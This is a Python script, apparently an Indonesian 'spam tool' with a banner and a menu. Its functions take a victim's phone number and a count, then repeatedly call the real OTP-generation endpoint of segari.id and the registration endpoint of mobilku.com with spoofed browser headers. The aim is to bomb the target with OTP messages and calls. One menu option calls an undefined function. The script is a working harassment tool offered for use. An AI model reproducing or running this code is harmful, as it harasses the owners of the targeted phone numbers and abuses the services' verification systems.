import requests,json,os,time,random,datetime
from rich.panel import Panel as nel
from rich import print as cetak
from time import strftime
from gtts import gTTS
from rich.columns import Columns
from rich.console import Console as sol

CON = sol()


try:
	import gtts
except ImportError:
	cetak(" Modul gtts belum terinstall\n Silahkan Ketik pip install gtts")
	os.system("pip install gTTS")


#>>>>Warna Random<<<<<<#
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI

my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)

ua ='Mozilla/5.0 (Linux; Android 10; K)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36'
def goodwhat():
    a = int(strftime("%H"))
    if a <= 11:
        return "Selamat Pagi!!!"
    elif a <= 14:
        return "Selamat Siang!!!"
    elif a <= 17:
        return "Selamat Sore!!!"
    else:
        return "Selamat Malam!!!"

def audio():
	try:
		timee = strftime('%H')
		if str(timee) in ('04','05','06','07','08','09'):spech= 'selamat pagi'
		elif str(timee) in ('10','11','12','13','14','15'):spech= 'selamat siang'
		elif str(timee) in ('16','17','18'):spech= 'selamat sore'
		elif str(timee) in ('19','20','21','22','23','00','01','02','03'):spech='selamat malam'
		bahasa = "id"
		file=gTTS(f"{spech} bangg", lang=bahasa,slow=False)
		os.system('rm -rf ayang.mp3')
		file.save("ayang.mp3")
		os.popen("play-audio /sdcard/ayang.mp3")
		
	except:pass
def logo():
	audio()
	os.system("clear")
	cetak(nel( f"""  [b green]● [b yellow]● [b red]●[/][/]
   _________                  ____   ________ 
  /   _____/__________    ____\   \ /   /_   |[red]  ███████████████████[/]
  \_____  \\____ \__   \  /     \   Y   / |   |[red]  ███████████████████[/]
  /        \  |_> > __ \|  Y Y  \     /  |   |[white]  ███████████████████[/]
 /_______  /   __(____  /__|_|  /\___/   |___|[white]  ███████████████████[/]
         \/|__|       \/      \/              """))
	atsuna =[]
	atsuna.append(nel(f"[[red]+[/]] Author : Atsuna-ID\n[[red]+[/]] Team   : Jateng X Jawir\n[[red]+[/]] Tools  : Spam ",width=38,title="[yellow]DATA[/]"))
	atsuna.append(nel("[[red]+[/]] Yt     : Atsuna-Official\n[[red]+[/]] Fb     : Syarif Kan'z\n[[red]+[/]] Github : github.com/Atsuna-Id",width=37,title="[yellow]SOSMED[/]"))
	CON.print(Columns(atsuna))
	cetak(nel(f"[[yellow]1[/]] Spam Wa\n[[yellow]2[/]] Spam Call\n[[yellow]3[/]] Spam Sms "))
	a = input(f"  [{warna}?{N}] pilih : ")
	if a in ["1"]:
		akuu()
	elif a in ["2"]:
		call()
	elif a in ["3"]:
		wa()
		
def akuu():
	no = input(f"  [{warna}?{N}] Masukan Nomer +62 : ")
	Jum = int(input(f"  [{warna}?{N}] Masukan Jumlah Spam : "))
	head = {
'Host': 'api-v2.segari.id',
'content-length': '31',
'accept': 'application/json, text/plain, */*',
'x-segari-platform': 'web',
'content-type': 'application/json;charset=UTF-8',
'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36',
'origin': 'https://segari.id',
'sec-fetch-site': 'same-site',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer': 'https://segari.id/',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
  }
  
	data = json.dumps({"phoneNumber":no})
	k = 0
	for i in range(Jum):
		k+=1
		pos = requests.post("https://api-v2.segari.id//v1/otps/generate",headers=head,data=data).text
		if "Sent successfully" in pos:
			cetak(nel("Spam Wa Gagal Ke "+no,title="Not Sending"))
		else:
			cetak(nel("Spam Wa Berhasil ke "+no,title="[green]Send[/]"))
			
			
def call():
	no = input(f"  [{warna}?{N}] Masukan No +62 : ")
	names = input(f"  [{warna}?{N}] Masukan Nama : ")
	jumlah = int(input(f"  [{warna}?{N}] Masukan Jumlah Spam : "))
	headers_mobilku = {
'Host': 'api.mobilku.com',
'content-length': '40',
'accept': 'application/json, text/plain, */*',
'content-type': 'application/json',
'authorization': 'Bearer',
'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36',
'origin': 'https://www.mobilku.com',
'sec-fetch-site': 'same-site',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer': 'https://www.mobilku.com/',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
}
	
	data_mobilku = json.dumps({"name":names,"mobile":no})
	k = 0
	for i in range(jumlah):
		k+=1
		pos = requests.post("https://api.mobilku.com/user/register",data=data_mobilku,headers=headers_mobilku).text
		if "succes" in pos:
			print("  Spam Call Berhasil ke "+no)
		else:
			print("  Spam Call Gagal ke "+no)
		
	
	
	
	
	
	

	
#Xractz
#IndoSec


logo()
